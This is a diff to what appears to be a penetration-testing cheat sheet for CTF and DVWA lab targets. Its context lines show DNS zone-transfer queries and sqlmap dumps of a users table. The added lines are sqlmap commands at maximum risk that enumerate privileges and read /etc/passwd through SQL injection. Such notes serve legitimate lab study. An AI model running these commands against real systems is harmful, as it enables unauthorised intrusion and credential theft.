@@ -130,7 +130,7 @@ mount -t cifs //$IP/<share> <local dir> -o username="guest", password=""
 
 ### DNS
 
-```bash
+```sh
 dig @10.129.227.180 -x 10.129.227.180
 dig @10.129.227.180 trick.htb any
 dig @10.129.227.180 trick.htb axfr
@@ -382,6 +382,11 @@ sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Subm
 sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --tables -D dvwa
 sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --columns -D dvwa -T users
 sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --dump -D dvwa -T users
+```
+
+```sh
+sqlmap -r req.txt --risk 3 --level 5 --technique=BEU --batch --privileges
+sqlmap -r req.txt --risk 3 --level 5 --technique=BEU --batch --privileges --file-read=/etc/passwd
 ```
 
 ```sh
